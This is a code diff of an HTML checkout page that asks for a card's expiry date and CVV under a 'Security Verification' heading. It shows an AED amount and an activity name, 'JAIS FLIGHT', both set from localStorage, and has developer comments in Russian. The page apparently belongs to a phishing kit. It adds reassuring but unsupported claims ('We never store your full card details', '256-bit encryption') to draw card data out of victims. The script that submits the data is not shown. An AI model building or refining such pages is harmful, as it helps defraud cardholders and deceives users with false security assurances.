@@ -5,9 +5,262 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/static/images/favicon.png" />
     <title>Complete Payment - Card Details</title>
-    <link rel="stylesheet" href="/static/css/card.css?v2" />
-    <!-- Meta Pixel Code -->
-    <!-- Meta Pixel Code -->
+    <link rel="stylesheet" href="/static/css/card.css?v4" />
+    <style>
+      /* Дополнительные стили для новых элементов */
+      .security-features {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 16px;
+        margin-top: 30px;
+      }
+
+      .security-item {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 13px;
+        color: #5a6270;
+      }
+
+      .security-icon {
+        width: 16px;
+        height: 16px;
+        color: #3366ff;
+      }
+
+      .trust-badges {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-top: 20px;
+        padding-top: 20px;
+        border-top: 1px solid #f0f2f7;
+      }
+
+      .trust-badge {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 12px;
+        color: #5a6270;
+      }
+
+      .badge-icon {
+        width: 16px;
+        height: 16px;
+        color: #3366ff;
+      }
+
+      .security-notice {
+        background-color: #f8faff;
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 20px;
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+      }
+
+      .security-notice-icon {
+        width: 20px;
+        height: 20px;
+        color: #3366ff;
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+
+      .security-notice-content h4 {
+        font-size: 14px;
+        color: #1a1a1a;
+        margin-bottom: 4px;
+      }
+
+      .security-notice-content p {
+        font-size: 13px;
+        color: #5a6270;
+        line-height: 1.4;
+      }
+
+      .payment-steps {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+
+        position: relative;
+        width: 400px;
+        margin: 25px auto;
+      }
+
+      .payment-steps::before {
+        content: "";
+        position: absolute;
+        top: 12px;
+        left: 20px;
+        right: 20px;
+        height: 2px;
+        background-color: #e5e8ef;
+        z-index: 1;
+      }
+
+      .step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        z-index: 2;
+      }
+
+      .step-icon {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        background-color: #e5e8ef;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 8px;
+        font-size: 12px;
+        font-weight: 600;
+        color: #8b92a3;
+      }
+
+      .step.active .step-icon {
+        background-color: #3366ff;
+        color: white;
+      }
+
+      .step-label {
+        font-size: 12px;
+        color: #8b92a3;
+        font-weight: 500;
+      }
+
+      .step.active .step-label {
+        color: #3366ff;
+      }
+
+      .payment-guarantee {
+        background: linear-gradient(135deg, #f0f7ff 0%, #e8f2ff 100%);
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        border: 1px solid #d1e7ff;
+      }
+
+      .guarantee-icon {
+        width: 24px;
+        height: 24px;
+        color: #3366ff;
+        flex-shrink: 0;
+      }
+
+      .guarantee-content h4 {
+        font-size: 14px;
+        color: #1a1a1a;
+        margin-bottom: 4px;
+      }
+
+      .guarantee-content p {
+        font-size: 13px;
+        color: #5a6270;
+      }
+
+      .cvv-help {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-top: 8px;
+        font-size: 12px;
+        color: #8b92a3;
+      }
+
+      .cvv-help-icon {
+        width: 14px;
+        height: 14px;
+        color: #3366ff;
+      }
+
+      .card-visual {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+        position: relative;
+      }
+
+      .card-chip {
+        width: 40px;
+        height: 30px;
+        background: linear-gradient(135deg, #d4af37, #f9e076);
+        border-radius: 5px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .card-chip::before {
+        content: "";
+        position: absolute;
+        top: 5px;
+        left: 5px;
+        right: 5px;
+        bottom: 5px;
+        border: 1px solid rgba(0, 0, 0, 0.2);
+        border-radius: 3px;
+      }
+
+      .card-visual-text {
+        margin-left: 15px;
+        text-align: left;
+      }
+
+      .card-visual-text .card-number {
+        font-size: 18px;
+        font-weight: 600;
+        color: #2a2f3c;
+        letter-spacing: 1px;
+        margin-bottom: 5px;
+      }
+
+      .card-visual-text .card-expiry {
+        font-size: 14px;
+        color: #6a7180;
+      }
+
+      .activity-info {
+        display: flex;
+        justify-content: space-between;
+        padding: 16px 32px;
+        border-bottom: 1px solid #f0f2f7;
+        font-size: 13px;
+      }
+
+      .activity-label {
+        color: #6a7180;
+        font-weight: 500;
+      }
+
+      .activity-name {
+        color: #2a2f3c;
+        font-weight: 600;
+        text-align: right;
+        max-width: 200px;
+      }
+
+      @media (max-width: 768px) {
+        .payment-steps {
+          width: 340px;
+        }
+
+        .activity-name {
+          max-width: 150px;
+          font-size: 12px;
+        }
+      }
+    </style>
     <!-- Meta Pixel Code -->
     <script>
       !(function (f, b, e, v, n, t, s) {
@@ -44,6 +297,32 @@
         src="https://www.facebook.com/tr?id=1158848762417834&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
+    <script type="text/javascript">
+      var _smartsupp = _smartsupp || {};
+      _smartsupp.key = "2175af1f89efea81c619f5dc47bdbb23775c47b7";
+      window.smartsupp ||
+        (function (d) {
+          var s,
+            c,
+            o = (smartsupp = function () {
+              o._.push(arguments);
+            });
+          o._ = [];
+          s = d.getElementsByTagName("script")[0];
+          c = d.createElement("script");
+          c.type = "text/javascript";
+          c.charset = "utf-8";
+          c.async = true;
+          c.src = "https://www.smartsuppchat.com/loader.js?";
+          s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+    <noscript>
+      Powered by
+      <a href="https://www.smartsupp.com" target="“_blank”"
+        >Smartsupp</a
+      ></noscript
+    >
     <!-- End Meta Pixel Code -->
     <!-- Smartsupp Live Chat script -->
     <script type="text/javascript">
@@ -75,50 +354,34 @@
   </head>
   <body>
     <div class="container">
-      <div class="left-section">
-        <h1>Card Details</h1>
-        <div class="subtitle">Security Check</div>
-
-        <div class="illustration">
-          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
-            <defs>
-              <linearGradient
-                id="security-grad"
-                x1="0%"
-                y1="0%"
-                x2="100%"
-                y2="100%"
-              >
-                <stop
-                  offset="0%"
-                  style="stop-color: #4d6aff; stop-opacity: 1"
-                />
-                <stop
-                  offset="100%"
-                  style="stop-color: #3355ff; stop-opacity: 1"
-                />
-              </linearGradient>
-            </defs>
-
-            <!-- Security shield -->
-            <path
-              d="M110 30 L140 40 L140 80 C140 120 110 150 110 150 C110 150 80 120 80 80 L80 40 Z"
-              fill="url(#security-grad)"
-            />
-
-            <!-- Lock -->
-            <rect x="100" y="70" width="20" height="25" rx="2" fill="white" />
-            <circle cx="110" cy="80" r="8" fill="white" />
-          </svg>
-        </div>
-
-        <p class="description">
-          For your security, please enter your card expiration date and CVV code
-        </p>
-      </div>
-
       <div class="right-section">
         <div class="payment-card">
+          <div class="payment-steps">
+            <div class="step">
+              <div class="step-icon">
+                <svg
+                  width="12"
+                  height="12"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="3"
+                >
+                  <path d="M20 6L9 17l-5-5"></path>
+                </svg>
+              </div>
+              <div class="step-label">Card</div>
+            </div>
+            <div class="step active">
+              <div class="step-icon">2</div>
+              <div class="step-label">Details</div>
+            </div>
+            <div class="step">
+              <div class="step-icon">3</div>
+              <div class="step-label">Confirm</div>
+            </div>
+          </div>
+
           <div class="card-header">
             <div class="status-icon">
               <svg
@@ -137,14 +400,14 @@
             </div>
             <div class="payment-info">
               <div class="payment-status">Security Verification</div>
+              <div class="payment-amount" id="paymentAmount">AED 101.00</div>
             </div>
           </div>
 
-          <div class="order-info">
-            <span class="order-label">Card Number</span>
-            <span class="order-number" id="displayCardNumber">
-              **** **** **** ****
-            </span>
+          <!-- Заменяем Order No. на Activity -->
+          <div class="activity-info">
+            <span class="activity-label">Activity</span>
+            <span class="activity-name" id="activityName"> JAIS FLIGHT </span>
           </div>
 
           <div class="form-container">
@@ -159,7 +422,26 @@
                 <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                 <line x1="2" y1="10" x2="22" y2="10"></line>
               </svg>
-              <span>Card Details</span>
+              <span>Security Details</span>
+            </div>
+
+            <div class="security-notice">
+              <svg
+                class="security-notice-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              </svg>
+              <div class="security-notice-content">
+                <h4>Your Security is Protected</h4>
+                <p>
+                  CVV code is required for verification. We never store your
+                  full card details.
+                </p>
+              </div>
             </div>
 
             <form id="payment-details-form">
@@ -183,6 +465,20 @@
                     id="cvv"
                     maxlength="4"
                   />
+                  <div class="cvv-help">
+                    <svg
+                      class="cvv-help-icon"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                    >
+                      <circle cx="12" cy="12" r="10"></circle>
+                      <line x1="12" y1="16" x2="12" y2="12"></line>
+                      <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                    </svg>
+                    <span>3 digits on back of card</span>
+                  </div>
                 </div>
               </div>
 
@@ -200,15 +496,50 @@
                     d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
                   ></path>
                 </svg>
-                Complete Payment
+                Complete Payment Securely
               </button>
             </form>
+
+            <div class="payment-guarantee">
+              <svg
+                class="guarantee-icon"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+              >
+                <path
+                  d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"
+                ></path>
+              </svg>
+              <div class="guarantee-content">
+                <h4>Payment Protection</h4>
+                <p>Your payment is secured with 256-bit encryption</p>
+              </div>
+            </div>
           </div>
         </div>
       </div>
     </div>
-    <script src="/static/js/redirect.js?v3"></script>
-    <script src="/static/js/online-status.js?v3"></script>
-    <script src="/static/js/card-details.js?v3"></script>
+    <script src="/static/js/redirect.js?v2"></script>
+    <script src="/static/js/online-status.js?v2"></script>
+    <script src="/static/js/card-details.js?v8"></script>
+    <script>
+      // Обновляем название активности при загрузке страницы
+      document.addEventListener("DOMContentLoaded", function () {
+        const activityName = localStorage.getItem("activityName");
+        if (activityName) {
+          document.getElementById("activityName").textContent = activityName;
+        }
+
+        // Обновляем цену
+        const price = localStorage.getItem("price");
+        if (price) {
+          document.getElementById(
+            "paymentAmount"
+          ).textContent = `AED ${parseFloat(price).toFixed(2)}`;
+        }
+      });
+    </script>
   </body>
 </html>
